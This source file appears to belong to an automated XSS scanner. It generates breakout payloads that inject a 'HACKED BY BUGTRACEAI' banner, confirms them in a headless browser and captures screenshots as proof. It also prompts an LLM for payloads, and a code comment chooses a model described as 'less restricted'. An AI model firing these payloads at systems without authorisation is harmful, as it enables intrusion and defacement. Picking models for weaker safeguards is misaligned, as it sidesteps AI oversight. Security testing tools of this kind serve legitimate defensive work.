"""
Hybrid engine shell: omniprobe → seed → amplify → mass attack → visual → browser validation.

Extracted from xss_agent.py so no single shell file exceeds the agent-workable
limit (hard max 1500 LOC per module). XSSAgent composes this mixin.
"""
from __future__ import annotations

# --- shell runtime deps (mixin methods used these from xss_agent module scope) ---
import asyncio
import aiohttp
import json
import re
import urllib.parse
import html as html_module
from dataclasses import asdict
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Union, Iterable

from bugtrace.utils.logger import get_logger
from bugtrace.core.ui import dashboard
from bugtrace.core.config import settings
from bugtrace.core.llm_client import llm_client
from bugtrace.core.http_manager import http_manager, ConnectionProfile
from bugtrace.core.queue import queue_manager
from bugtrace.core.event_bus import EventType
from bugtrace.core.verbose_events import create_emitter
from bugtrace.core.validation_status import ValidationStatus, requires_cdp_validation, get_validation_status
from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason
from bugtrace.tools.interactsh import InteractshClient
from bugtrace.tools.visual.verifier import XSSVerifier
from bugtrace.tools.headless import detect_dom_xss, detect_dom_xss_batch
from bugtrace.tools.external import external_tools
from bugtrace.tools.go_bridge import GoFuzzerBridge, FuzzResult, Reflection
from bugtrace.utils.payload_amplifier import PayloadAmplifier
from bugtrace.memory.payload_learner import PayloadLearner
from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy
from bugtrace.tools.manipulator.context_analyzer import ContextAnalyzer, ReflectionContext
from bugtrace.tools.waf import waf_fingerprinter, strategy_router, encoding_techniques
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.agents.specialist_utils import load_full_payload_from_json, load_full_finding_data
from bugtrace.reporting.standards import (
    get_cwe_for_vuln,
    get_remediation_for_vuln,
    normalize_severity,
    get_default_severity,
)
from bugtrace.agents.xss import coverage as xss_coverage
from bugtrace.agents.xss.types import XSSFinding, InjectionContext, ValidationMethod
from bugtrace.agents.xss.constants import (
    PROBE_STRING,
    PROBE_STRING_SAFE,
    OMNIPROBE_PAYLOAD,
    GOLDEN_PAYLOADS,
    FRAGMENT_PAYLOADS,
)
from bugtrace.agents.xss.finding_builder import (
    mask_auth_headers as _mask_auth_headers,
    auth_meta as _auth_meta,
    excerpt_around as _excerpt_around,
    build_raw_http as _build_raw_http,
    promote_repro as _promote_repro,
)
from bugtrace.agents.xss.waf import (
    detect_payload_encoding as _pure_detect_payload_encoding,
    record_bypass_result as _pure_record_bypass_result,
    get_waf_optimized_payloads as _pure_get_waf_optimized_payloads,
)
logger = get_logger(__name__)
from bugtrace.agents.xss.shell_constants import (
    _BROWSER_ONLY_CONTEXTS,
    _CDP_PROOF_LOCK,
    _L05_CHAR_PROBE,
    _LEGACY_PROBE_MARKER,
    _PROBE_NO_REFLECTION,
    _PROBE_NO_RESPONSE,
    _PROBE_REFLECTED,
    _REDIRECT_PARAM_SET,
    _REFLECTION_SNIPPET_RADIUS,
)
from bugtrace.agents.xss.context_reflection import as_context_set as _as_context_set
# --- end shell runtime deps ---


class XSSHybridVisualMixin:
    """Visual payload generation, validation, screenshots."""

    async def _validate_visual_payload(
        self,
        param: str,
        payload: str,
        screenshots_dir: Path
    ) -> Optional[Dict[str, Any]]:
        """
        Validate a visual payload (with HACKED BY BUGTRACEAI banner).

        This is the BULLETPROOF validation:
        1. Playwright navigates to URL with payload
        2. Detects XSS execution (dialog, DOM markers)
        3. Captures screenshot
        4. Vision AI confirms "HACKED BY BUGTRACEAI" banner is visible

        Args:
            param: Parameter name
            payload: Visual payload with banner injection
            screenshots_dir: Directory to save screenshot

        Returns:
            Evidence dict with vision_confirmed=True if fully validated
        """
        attack_url = self._build_attack_url(param, payload)

        # Use verify_xss with screenshot capture
        result = await self.verifier.verify_xss(
            url=attack_url,
            screenshot_dir=str(screenshots_dir),
            timeout=10.0,
            max_level=3  # Playwright only for visual payloads
        )

        if not result.success:
            return None

        evidence = {
            "playwright_confirmed": True,
            "screenshot_path": result.screenshot_path,
            "method": "L3: Playwright + Vision",
            "level": 3,
            "status": "PENDING_VISION"
        }
        evidence.update(result.details or {})

        # CRITICAL: Vision AI validation of screenshot
        if result.screenshot_path:
            await self._run_vision_validation(
                screenshot_path=result.screenshot_path,
                attack_url=attack_url,
                payload=payload,
                evidence=evidence
            )

            if evidence.get("vision_confirmed"):
                evidence["status"] = "VALIDATED_CONFIRMED"
                evidence["validation_method"] = "visual_playwright_vision"
                return evidence

        # Playwright confirmed but Vision didn't see banner
        # Still return evidence but without vision_confirmed
        return evidence
    def _emit_xss_finding(self, finding_dict: Dict, status: str = None, needs_cdp: bool = False) -> bool:
        """
        Helper to emit XSS finding using BaseAgent.emit_finding() with validation.

        Returns:
            True if the finding passed validation and was emitted; False if rejected.
        """
        # Wrap in full event structure
        full_event = {
            "specialist": "xss",
            "finding": finding_dict,
            "status": status or ValidationStatus.VALIDATED_CONFIRMED.value,
            "validation_requires_cdp": needs_cdp,
            "scan_context": self._scan_context,
        }

        # Validate here so queue mode emits one enveloped event instead of the
        # bare BaseAgent event followed by the full event.
        is_valid, error = self._validate_before_emit(finding_dict)
        if not is_valid:
            logger.warning(f"[{self.name}] Finding rejected: {error}")
            return False

        from bugtrace.core.event_bus import EventType
        if settings.WORKER_POOL_EMIT_EVENTS:
            asyncio.create_task(self.event_bus.emit(EventType.VULNERABILITY_DETECTED, full_event))
        return True
    async def _capture_proof_screenshot(self, finding_dict: Dict) -> None:
        """Best-effort: capture a real browser screenshot of a confirmed XSS PoC.

        XSS is usually confirmed early at the HTTP level (L0.5 smart probe), which
        short-circuits the escalation BEFORE the browser stage (L5) — so validated
        findings shipped with `screenshot_path: None` and no visual proof. This
        decouples evidence capture from the escalation short-circuit: for ANY
        confirmed finding that still lacks a screenshot, navigate a real browser to
        the exploit URL and capture one. The finding is already confirmed, so a
        capture failure NEVER affects validation (purely additive report evidence).
        """
        try:
            evidence = finding_dict.get("evidence")
            if not isinstance(evidence, dict):
                evidence = {}
            if evidence.get("screenshot") or evidence.get("screenshot_path") or finding_dict.get("screenshot_path"):
                return  # already has visual proof (e.g. L5 / DOM path)

            payload = finding_dict.get("payload")
            param = finding_dict.get("parameter")
            base_url = finding_dict.get("url") or self.url
            if not payload:
                return

            # The proof screenshot must show the VISIBLE "HACKED BY BUGTRACEAI"
            # banner, not the silent document.title/7*7 payload that confirmed the
            # finding over HTTP (that paints nothing in the body → a plain-page
            # repro_attempt shot). Translate silent → visual with the SAME
            # single-source transform the report uses, and screenshot THAT. The
            # finding is already confirmed, so this is purely additive evidence.
            vuln_type = finding_dict.get("type") or "XSS"
            try:
                from bugtrace.agents.reporting_mod.finding_processor import upgrade_payload
                visible_payload = upgrade_payload(payload, vuln_type) or payload
            except Exception:
                visible_payload = payload

            # Build the exploit URL from the VISIBLE payload against the finding's
            # OWN url. Any pre-stored exploit_url was built from the silent payload,
            # so rebuild whenever we have a parameter to inject into.
            exploit_url = None
            if param:
                try:
                    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
                    _p = urlparse(base_url)
                    _q = {k: (v[0] if isinstance(v, list) else v)
                          for k, v in parse_qs(_p.query, keep_blank_values=True).items()}
                    _q[param] = visible_payload
                    exploit_url = urlunparse((_p.scheme, _p.netloc, _p.path,
                                              _p.params, urlencode(_q), _p.fragment))
                except Exception:
                    exploit_url = None
            if not exploit_url:
                # No param (e.g. DOM/path sink): fall back to any stored URL, then base.
                exploit_url = finding_dict.get("exploit_url") or base_url
            if not exploit_url:
                return

            shots_dir = self.report_dir / "screenshots"
            shots_dir.mkdir(parents=True, exist_ok=True)

            # Playwright first — multi-threaded, so concurrent captures run in
            # parallel. Fast path that handles most XSS.
            result = await self.verifier.verify_xss(
                exploit_url, screenshot_dir=str(shots_dir), timeout=12.0, max_level=3
            )
            path = getattr(result, "screenshot_path", None)

            # Playwright is NOT a real browser, so some XSS won't actually execute
            # in it (the screenshot would show the page WITHOUT the PoC firing).
            # When Playwright did not confirm execution, fall back to a real Chrome
            # via CDP for a true firing screenshot. CDP is single-threaded, so
            # serialize the fallback with a process-wide lock — only the few XSS
            # Playwright can't render pay the serialization cost.
            if not getattr(result, "success", False):
                try:
                    if await self.verifier._check_cdp_available():
                        async with _CDP_PROOF_LOCK:
                            cdp_res = await self.verifier._verify_with_cdp(
                                exploit_url, str(shots_dir), 12.0, None
                            )
                        cdp_path = getattr(cdp_res, "screenshot_path", None)
                        if getattr(cdp_res, "success", False) and cdp_path:
                            result, path = cdp_res, cdp_path
                            logger.info(f"[{self.name}] 📸 CDP fallback captured real PoC for {finding_dict.get('parameter')}")
                except Exception as cdp_err:
                    logger.debug(f"[{self.name}] CDP proof fallback skipped: {cdp_err}")
            # Only attach a shot where the banner ACTUALLY fired (result.success is
            # True for a Playwright hit, or reassigned from a successful CDP fallback
            # above). verify_xss also returns a repro_attempt_*.png when nothing
            # rendered — shipping that plain page as the PoC would contradict the
            # finding's own banner payload, so gate the store on success.
            if path and getattr(result, "success", False):
                # Store a path RELATIVE to the report dir so the WEB can fetch it
                # via GET /scans/{id}/files/{relpath} (the serve route is :path).
                try:
                    rel_path = str(Path(path).resolve().relative_to(self.report_dir.resolve()))
                except Exception:
                    rel_path = path
                finding_dict["screenshot_path"] = rel_path
                finding_dict.setdefault("evidence", {})
                if isinstance(finding_dict["evidence"], dict):
                    finding_dict["evidence"]["screenshot"] = rel_path
                    finding_dict["evidence"]["screenshot_captured_post_confirm"] = True
                    # Record the URL that actually produced the banner shot, so the
                    # report can present a PoC consistent with the screenshot.
                    finding_dict["evidence"]["visual_exploit_url"] = exploit_url
                logger.info(f"[{self.name}] 📸 Captured PoC screenshot for {finding_dict.get('parameter')}: {rel_path}")

                # (a) Align the reproduction to the banner request we ACTUALLY
                # navigated for this screenshot, so the report's http_request /
                # repro / WEB AI-Repeater replay demonstrates the SAME visible
                # banner as the screenshot, curl and (upgraded) payload — instead
                # of the silent document.title detection probe, which replays to a
                # blank page. The original probe is preserved as `detection_request`
                # so no forensic detail is lost. Only for GET-style reflected XSS
                # (exploit_url was built from `param`); best-effort, never fatal.
                if param:
                    try:
                        repro = finding_dict.get("repro")
                        det = repro.get("confirming_request") if isinstance(repro, dict) else None
                        if isinstance(det, dict) and str(det.get("method", "GET")).upper() == "GET":
                            repro.setdefault("detection_request", det)
                            banner_cr = dict(det)
                            banner_cr["url"] = exploit_url
                            repro["confirming_request"] = banner_cr
                            repro["capture_method"] = "visual_banner"
                            finding_dict["http_request"] = _build_raw_http(banner_cr)
                    except Exception as _repro_err:
                        logger.debug(f"[{self.name}] repro banner-align skipped: {_repro_err}")

                # Complement: ask Vision AI to confirm the banner is visible in the
                # captured shot (records evidence.vision_confirmed as double proof).
                # Best-effort: a Vision failure never affects the already-confirmed
                # finding.
                if isinstance(finding_dict.get("evidence"), dict):
                    try:
                        await self._run_vision_validation(
                            str(path), exploit_url, visible_payload, finding_dict["evidence"]
                        )
                    except Exception as vis_err:
                        logger.debug(f"[{self.name}] proof-shot vision check skipped: {vis_err}")
        except Exception as e:
            logger.debug(f"[{self.name}] proof screenshot capture skipped: {e}")
    def _update_learned_breakouts(self, payload: str) -> None:
        """
        Update breakouts.json with successful payload patterns.

        Extracts the breakout prefix from a successful payload and
        increments its success_count for future prioritization.
        """
        try:
            if not self._payload_amplifier:
                return

            # Extract prefix by finding common breakout patterns
            for prefix in self._payload_amplifier.get_prefixes(category="xss"):
                if prefix and payload.startswith(prefix):
                    # Found the breakout used - would update success_count here
                    logger.debug(f"[{self.name}] Learned successful breakout: {prefix}")
                    self.payload_learner.record_success(payload, "xss")
                    break

        except Exception as e:
            logger.debug(f"[{self.name}] Failed to update learned breakouts: {e}")
    async def _hybrid_phase45_visual_generation(
        self,
        param: str,
        fuzz_result: "FuzzResult",
        failed_payloads: List[str] = None
    ) -> List[str]:
        """
        Phase 4.5: Generate visual payloads from WORKING payloads.

        SMART APPROACH: Instead of generating generic visual payloads,
        we take the payloads that ACTUALLY WORKED (reflected) and ask
        DeepSeek to adapt them to show the HACKED BY BUGTRACEAI banner.

        Flow:
        1. Get working payloads from fuzz results
        2. Ask LLM: "These payloads WORK, adapt them to show the banner"
        3. This is smarter because the breakout pattern is already proven

        Args:
            param: Parameter name
            fuzz_result: Results from Go fuzzer with reflection contexts
            failed_payloads: Payloads that failed in previous attempts (to avoid)

        Returns:
            List of visual payloads based on WORKING payloads
        """
        if failed_payloads is None:
            failed_payloads = []

        if not fuzz_result.reflections:
            return []

        # Get the TOP WORKING payloads (the ones that actually reflected)
        working_payloads = []
        seen = set()
        for ref in fuzz_result.reflections[:10]:  # Top 10 working payloads
            if ref.payload and ref.payload not in seen:
                working_payloads.append({
                    "payload": ref.payload,
                    "context": ref.context or "unknown"
                })
                seen.add(ref.payload)

        if not working_payloads:
            return []

        retry_info = f" (retry, avoiding {len(failed_payloads)} failed)" if failed_payloads else ""
        dashboard.log(
            f"[{self.name}] 🎨 Phase 4.5: Found {len(working_payloads)} WORKING payloads, asking LLM for visual versions{retry_info}",
            "INFO"
        )

        # Ask DeepSeek to adapt the WORKING payloads to include the visual banner
        visual_payloads = await self._adapt_working_payloads_to_visual(working_payloads, failed_payloads)

        if visual_payloads:
            dashboard.log(
                f"[{self.name}] 🎯 Generated {len(visual_payloads)} visual payloads from working payloads",
                "SUCCESS"
            )

        return visual_payloads
    async def _adapt_working_payloads_to_visual(
        self,
        working_payloads: List[Dict[str, str]],
        failed_payloads: List[str] = None
    ) -> List[str]:
        """
        Ask LLM to adapt WORKING payloads to include the visual banner.

        This is smarter than generating generic payloads because:
        - We KNOW the breakout pattern works (it reflected)
        - We just need to add the visual component

        Args:
            working_payloads: List of dicts with 'payload' and 'context'
            failed_payloads: Payloads that already failed (to avoid regenerating)

        Returns:
            List of visual payloads
        """
        from bugtrace.core.llm_client import llm_client

        if failed_payloads is None:
            failed_payloads = []

        # Format working payloads for the prompt
        payloads_str = "\n".join([
            f"- Payload: {p['payload'][:100]}... (context: {p['context']})"
            for p in working_payloads[:5]
        ])

        # Add failed payloads warning if retrying
        failed_warning = ""
        if failed_payloads:
            failed_samples = "\n".join([f"- {p[:80]}..." for p in failed_payloads[:5]])
            failed_warning = f"""

    IMPORTANT: These payloads ALREADY FAILED validation. Generate DIFFERENT ones:
    {failed_samples}

    Try different approaches:
    - Different DOM manipulation methods (createElement vs innerHTML vs insertAdjacentHTML)
    - Different event handlers (onerror, onload, onfocus)
    - Different element types (div, img, svg, iframe)
    - Different string concatenation techniques
    """

        prompt = f"""You are an XSS expert. These payloads SUCCESSFULLY REFLECTED on the target:

    {payloads_str}

    Your task: Adapt each working payload to ALSO inject a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI".

    RULES:
    1. Keep the same breakout technique that made the payload work
    2. Add code to create a visible red div with the text
    3. Use BACKTICKS (`) for strings to avoid escaping issues
    4. The banner style: position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999

    Example transformations:
    - If payload is: \\';alert(1)//
      Visual version: \\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//

    - If payload is: "><script>alert(1)</script>
      Visual version: "><div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999">HACKED BY BUGTRACEAI</div><script>

    Generate 10 visual versions of the working payloads. Return ONLY the payloads, one per line, no explanations.{failed_warning}"""

        try:
            response = await llm_client.generate(
                prompt=prompt,
                module_name="XSS-AdaptVisual",
                model_override=settings.MUTATION_MODEL,
                temperature=0.7,
                max_tokens=2000
            )

            if not response:
                # Fallback to prebuilt payloads
                return self._build_visual_payloads_from_breakouts()

            # Parse payloads
            payloads = []
            failed_set = set(failed_payloads) if failed_payloads else set()
            for line in response.strip().split("\n"):
                line = line.strip()
                if line and not line.startswith("#") and len(line) > 10:
                    if len(line) > 2 and line[0].isdigit() and line[1] in ".):":
                        line = line[2:].strip()
                    # Skip payloads that already failed
                    if line not in failed_set:
                        payloads.append(line)

            # If LLM returned good payloads, use them; otherwise fallback
            if len(payloads) >= 3:
                return payloads[:10]
            else:
                logger.warning(f"[{self.name}] LLM returned few payloads, adding prebuilt fallback")
                fallback = [p for p in self._build_visual_payloads_from_breakouts() if p not in failed_set]
                return payloads + fallback

        except Exception as e:
            logger.warning(f"[{self.name}] Failed to adapt payloads: {e}, using prebuilt")
            return self._build_visual_payloads_from_breakouts()
    def _build_visual_payloads_from_breakouts(self) -> List[str]:
        """
        Build visual payloads dynamically from breakouts.json.

        This combines XSS breakout prefixes with visual payload templates
        to create payloads that inject the HACKED BY BUGTRACEAI banner.

        Returns:
            List of visual payloads built from breakouts.json prefixes
        """
        # Visual payload templates (without breakout prefix)
        # Template with backticks (for JS contexts where quotes are escaped)
        JS_VISUAL_BACKTICK = "var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//"

        # Template with single quotes (standard JS)
        JS_VISUAL_SINGLE = "var d=document.createElement('div');d.style='position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d);//"

        # HTML template (for attribute/tag breakouts)
        HTML_VISUAL = "<div style=\"position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999\">HACKED BY BUGTRACEAI</div>"

        visual_payloads = []

        # Get XSS breakout prefixes from PayloadAmplifier (uses breakouts.json)
        if self._payload_amplifier:
            prefixes = self._payload_amplifier.get_prefixes(category="xss", max_priority=2)
        else:
            # Fallback if amplifier not initialized
            prefixes = ["'", "\"", "\\';", "\\\";", "';", "\";", "'>", "\">"]

        # Build payloads for each prefix
        for prefix in prefixes[:15]:  # Limit to top 15 prefixes
            # Determine which template to use based on prefix
            if prefix.startswith("\\"):
                # Backslash breakouts work best with backticks
                visual_payloads.append(f"{prefix}{JS_VISUAL_BACKTICK}")
            elif prefix.endswith(">"):
                # Tag breakouts use HTML template
                visual_payloads.append(f"{prefix}{HTML_VISUAL}<input value=\"")
            elif prefix in ("'", "';", "'//"):
                # Single quote breakouts
                visual_payloads.append(f"{prefix}{JS_VISUAL_SINGLE}")
            elif prefix in ("\"", "\";", "\"//"):
                # Double quote breakouts use backticks to avoid escaping issues
                visual_payloads.append(f"{prefix}{JS_VISUAL_BACKTICK}")
            else:
                # Default: try backtick version
                visual_payloads.append(f"{prefix}{JS_VISUAL_BACKTICK}")

        logger.debug(f"[{self.name}] Built {len(visual_payloads)} visual payloads from breakouts.json")
        return visual_payloads
    async def _ask_deepseek_visual_payloads(
        self,
        param: str,
        contexts: List[str],
        sample_payloads: Dict[str, str],
        html_snippet: str = ""
    ) -> List[str]:
        """
        Ask DeepSeek to generate payloads that inject visible HACKED BY BUGTRACEAI banner.

        Args:
            param: Parameter name
            contexts: List of reflection contexts found (e.g., ["html_text", "attribute_value"])
            sample_payloads: Example payloads that reflected per context
            html_snippet: Actual HTML around the reflection point for context-aware generation

        Returns:
            List of 10 visual payloads
        """
        from bugtrace.core.llm_client import llm_client

        contexts_str = ", ".join(contexts)
        samples_str = "\n".join([f"- {ctx}: {p[:80]}..." for ctx, p in sample_payloads.items()])

        # Build context-aware prompt section
        snippet_section = ""
        if html_snippet:
            snippet_section = f"""
    ACTUAL HTML WHERE THE PARAMETER REFLECTS:
    ```
    {html_snippet[:500]}
    ```
    Analyze this code carefully. Identify:
    - What quote type wraps the reflection (single, double, backtick)
    - What escaping the server applies (backslash doubling, HTML encoding)
    - The exact breakout sequence needed to escape THIS specific context
    Generate payloads that exploit THIS specific reflection, not generic payloads.
    """

        prompt = f"""You are an XSS payload expert. I found reflections in these contexts: {contexts_str}

    Sample payloads that reflected:
    {samples_str}
    {snippet_section}
    Generate exactly 10 XSS payloads that will:
    1. Break out of the current context
    2. Inject a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI"

    CRITICAL RULES FOR JAVASCRIPT CONTEXTS:
    - If context is javascript_string or script, quotes are often escaped (\\' or \\")
    - Use BACKTICKS (`) instead of quotes for all string literals inside the payload
    - Use \\'; or \\"; to break out of strings with backslash escaping
    - If the server escapes \\ to \\\\ but does NOT escape single quotes, use \\'; to break out
    - Example working payload: \\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//

    FOR HTML CONTEXTS, use this pattern:
    <div id="bt-pwn" style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999">HACKED BY BUGTRACEAI</div>

    Return ONLY the payloads, one per line, no explanations, no numbering.
    Each payload should target a different context or use a different breakout technique."""

        try:
            response = await llm_client.generate(
                prompt=prompt,
                module_name="XSS-VisualGen",
                model_override=settings.MUTATION_MODEL,  # DeepSeek - less restricted
                temperature=0.7,
                max_tokens=2000
            )

            if not response:
                return []

            # Parse payloads from response
            payloads = []
            for line in response.strip().split("\n"):
                line = line.strip()
                # Skip empty lines and explanations
                if not line or line.startswith("#") or line.startswith("//"):
                    continue
                # Remove numbering like "1." or "1)"
                if len(line) > 2 and line[0].isdigit() and line[1] in ".):":
                    line = line[2:].strip()
                if line and len(line) > 10:  # Minimum payload length
                    payloads.append(line)

            return payloads[:10]  # Max 10 payloads

        except Exception as e:
            logger.warning(f"[{self.name}] Visual payload generation failed: {e}")
            return []
